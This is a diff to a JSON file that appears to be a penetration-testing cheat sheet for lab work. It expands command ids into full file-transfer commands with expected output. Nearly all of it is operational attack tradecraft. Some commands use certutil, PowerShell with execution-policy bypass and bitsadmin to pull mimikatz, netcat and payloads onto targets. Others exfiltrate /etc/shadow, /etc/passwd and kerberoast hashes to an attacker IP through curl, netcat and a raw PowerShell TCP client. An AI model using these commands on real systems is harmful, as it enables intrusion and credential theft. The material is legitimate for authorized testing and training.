@@ -114,68 +114,172 @@
           "title": "Phase 1: Setup Attack Machine Servers",
           "notes": "Start these servers on Kali BEFORE attempting file transfers. Run in separate terminal windows to monitor connections.",
           "commands": [
-            "ft-python-http-server",
-            "ft-smb-server",
-            "ft-uploadserver"
+            {
+              "id": "ft-python-http-server",
+              "example": "python3 -m http.server 8000",
+              "shows": "Serving HTTP on 0.0.0.0 port <PORT>"
+            },
+            {
+              "id": "ft-smb-server",
+              "example": "impacket-smbserver share . -smb2support",
+              "shows": "Impacket v0.x.x - Copyright message"
+            },
+            {
+              "id": "ft-uploadserver",
+              "example": "python3 -m uploadserver 80",
+              "shows": "File upload available at /upload"
+            }
           ]
         },
         {
           "title": "Phase 2: Windows Target Downloads (Tools IN)",
-          "notes": "Transfer enumeration tools, exploits, or utilities TO Windows target. Try methods in order: certutil (fastest/stealthiest) → PowerShell → SMB (if HTTP blocked) → bitsadmin (background).",
+          "notes": "Transfer enumeration tools, exploits, or utilities TO Windows target. Try methods in order: certutil (fastest/stealthiest) \u2192 PowerShell \u2192 SMB (if HTTP blocked) \u2192 bitsadmin (background).",
           "commands": [
-            "ft-certutil-download",
-            "ft-powershell-iwr",
-            "ft-powershell-webclient",
-            "ft-smb-download",
-            "ft-bitsadmin-download"
+            {
+              "id": "ft-certutil-download",
+              "example": "certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe",
+              "shows": "****  Online  ****"
+            },
+            {
+              "id": "ft-powershell-iwr",
+              "example": "powershell -ep bypass -c \"Invoke-WebRequest -Uri http://10.10.14.5:8000/winPEAS.exe -OutFile C:\\Temp\\winPEAS.exe\"",
+              "shows": "StatusCode : 200"
+            },
+            {
+              "id": "ft-powershell-webclient",
+              "example": "powershell -ep bypass -c \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\"",
+              "shows": "Command completes without output (silence means success)"
+            },
+            {
+              "id": "ft-smb-download",
+              "example": "copy \\\\10.10.14.5\\share\\nc.exe C:\\Temp\\nc.exe",
+              "shows": "1 file(s) copied"
+            },
+            {
+              "id": "ft-bitsadmin-download",
+              "example": "bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\\Windows\\Temp\\payload.exe",
+              "shows": "Transfer job completed"
+            }
           ]
         },
         {
           "title": "Phase 3: Linux Target Downloads (Tools IN)",
-          "notes": "Transfer tools TO Linux target. wget is most common → curl if wget unavailable → /dev/tcp if no tools available.",
+          "notes": "Transfer tools TO Linux target. wget is most common \u2192 curl if wget unavailable \u2192 /dev/tcp if no tools available.",
           "commands": [
-            "ft-wget-download",
-            "ft-curl-download",
-            "ft-bash-dev-tcp"
+            {
+              "id": "ft-wget-download",
+              "example": "wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh",
+              "shows": "HTTP request sent, awaiting response... 200 OK"
+            },
+            {
+              "id": "ft-curl-download",
+              "example": "curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh",
+              "shows": "Progress bar reaches 100%"
+            },
+            {
+              "id": "ft-bash-dev-tcp",
+              "example": "cat < /dev/tcp/10.10.14.5/4444 > /tmp/file",
+              "shows": "File created: ls -la <OUTPUT>"
+            }
           ]
         },
         {
           "title": "Phase 4: Windows Exfiltration (Data OUT)",
-          "notes": "Transfer proof.txt, hashes, databases FROM Windows target to Kali. PowerShell upload is cleanest → SMB for large files → netcat if HTTP blocked → pure PowerShell TCP if nc.exe unavailable.",
+          "notes": "Transfer proof.txt, hashes, databases FROM Windows target to Kali. PowerShell upload is cleanest \u2192 SMB for large files \u2192 netcat if HTTP blocked \u2192 pure PowerShell TCP if nc.exe unavailable.",
           "commands": [
-            "ft-powershell-upload",
-            "ft-smb-upload",
-            "ft-nc-send",
-            "ft-powershell-tcp-send"
+            {
+              "id": "ft-powershell-upload",
+              "example": "powershell -ep bypass -c \"Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\\Users\\user\\Desktop\\proof.txt'\"",
+              "shows": "StatusCode : 200"
+            },
+            {
+              "id": "ft-smb-upload",
+              "example": "copy \"C:\\Users\\user\\Desktop\\data.zip\" \\\\10.10.14.5\\share\\",
+              "shows": "1 file(s) copied"
+            },
+            {
+              "id": "ft-nc-send",
+              "example": "nc 10.10.14.5 4444 < /etc/passwd",
+              "shows": "Connection established (no error)"
+            },
+            {
+              "id": "ft-powershell-tcp-send",
+              "example": "$client = New-Object System.Net.Sockets.TcpClient(\"10.10.14.5\", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()",
+              "shows": "No error output"
+            }
           ]
         },
         {
           "title": "Phase 5: Linux Exfiltration (Data OUT)",
-          "notes": "Transfer data FROM Linux target to Kali. Curl upload for HTTP → netcat for raw TCP → SCP if SSH credentials available.",
+          "notes": "Transfer data FROM Linux target to Kali. Curl upload for HTTP \u2192 netcat for raw TCP \u2192 SCP if SSH credentials available.",
           "commands": [
-            "ft-curl-upload",
-            "ft-nc-send",
-            "ft-scp-download"
+            {
+              "id": "ft-curl-upload",
+              "example": "curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload",
+              "shows": "100 Continue"
+            },
+            {
+              "id": "ft-nc-send",
+              "example": "nc 10.10.14.5 4444 < /etc/passwd",
+              "shows": "Connection established (no error)"
+            },
+            {
+              "id": "ft-scp-download",
+              "example": "scp user@192.168.45.100:/home/user/proof.txt ./proof.txt",
+              "shows": "Password/key auth succeeds"
+            }
           ]
         },
         {
           "title": "Phase 6: Netcat & Raw TCP Transfers",
           "notes": "Universal transfer method when HTTP/SMB unavailable. Works on both Linux and Windows. Receiver starts first with -l flag, sender connects. Use pure PowerShell TCP if nc.exe not available on Windows.",
           "commands": [
-            "ft-nc-receive",
-            "ft-nc-send",
-            "ft-powershell-tcp-send"
+            {
+              "id": "ft-nc-receive",
+              "example": "nc -lvnp 4444 > received_file.txt",
+              "shows": "Listening on 0.0.0.0 <PORT>"
+            },
+            {
+              "id": "ft-nc-send",
+              "example": "nc 10.10.14.5 4444 < /etc/passwd",
+              "shows": "Connection established (no error)"
+            },
+            {
+              "id": "ft-powershell-tcp-send",
+              "example": "$client = New-Object System.Net.Sockets.TcpClient(\"10.10.14.5\", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()",
+              "shows": "No error output"
+            }
           ]
         },
         {
           "title": "Phase 7: Alternative Methods (Restricted Environments)",
           "notes": "Use when standard methods fail due to firewalls, missing tools, or security controls.",
           "commands": [
-            "ft-base64-encode",
-            "ft-bash-dev-tcp",
-            "ft-bitsadmin-download",
-            "ft-scp-upload",
-            "ft-scp-download"
+            {
+              "id": "ft-base64-encode",
+              "example": "base64 -w0 binary.exe",
+              "shows": "Base64 string output to terminal"
+            },
+            {
+              "id": "ft-bash-dev-tcp",
+              "example": "cat < /dev/tcp/10.10.14.5/4444 > /tmp/file",
+              "shows": "File created: ls -la <OUTPUT>"
+            },
+            {
+              "id": "ft-bitsadmin-download",
+              "example": "bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\\Windows\\Temp\\payload.exe",
+              "shows": "Transfer job completed"
+            },
+            {
+              "id": "ft-scp-upload",
+              "example": "scp exploit.sh user@192.168.45.100:/tmp/",
+              "shows": "Password prompt appears (if using password auth)"
+            },
+            {
+              "id": "ft-scp-download",
+              "example": "scp user@192.168.45.100:/home/user/proof.txt ./proof.txt",
+              "shows": "Password/key auth succeeds"
+            }
           ]
         }
       ],
